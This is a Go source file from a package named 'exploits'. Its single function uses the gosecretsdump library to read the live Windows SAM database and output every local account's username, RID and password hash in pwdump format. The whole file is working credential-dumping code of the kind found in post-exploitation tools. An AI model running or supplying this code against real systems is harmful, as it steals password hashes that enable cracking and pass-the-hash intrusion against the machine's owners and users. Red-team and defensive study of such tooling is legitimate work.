package exploits

import (
	"fmt"
	"strings"
	"github.com/lesnuages/gosecretsdump/pkg/samreader"
)


func Hashdump() (string, error) {
	liveSamReader, err := samreader.NewLive()
	if err != nil {
		return "", err
	}

	var outData strings.Builder
	errChan := make(chan error, 1)

	// Start the dump in a goroutine
	go func() {
		errChan <- liveSamReader.Dump()
		close(errChan) // Ensure channel is closed to avoid blocking
	}()

	// Process hashes as they come in
	for dh := range liveSamReader.GetOutChan() {
		if dh.Username != "" {
			outData.WriteString(fmt.Sprintf("%s:%d:%s::\n", dh.Username, dh.Rid, dh.HashString()))
		}
	}

	// Ensure we capture errors properly
	if err := <-errChan; err != nil {
		return "", err
	}

	return outData.String(), nil
}

